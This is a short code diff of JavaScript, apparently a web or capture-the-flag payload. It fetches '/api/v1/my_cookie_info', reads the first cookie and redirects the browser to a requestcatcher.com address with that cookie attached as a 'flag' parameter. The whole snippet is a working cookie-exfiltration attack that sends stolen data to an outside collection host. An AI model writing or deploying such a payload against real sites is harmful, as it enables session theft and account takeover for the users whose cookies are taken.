@@ -16,6 +16,6 @@
     console.error('Error:', error);
   });*/
 
-fetch("http://sflee.kro.kr:5555/api/v1/my_cookie_info")
+fetch("/api/v1/my_cookie_info")
   .then((response) => response.json())
   .then((data) => {var cookie = data.cookies[0]; location.href = "https://sflee.requestcatcher.com/test?flag=" + cookie;});
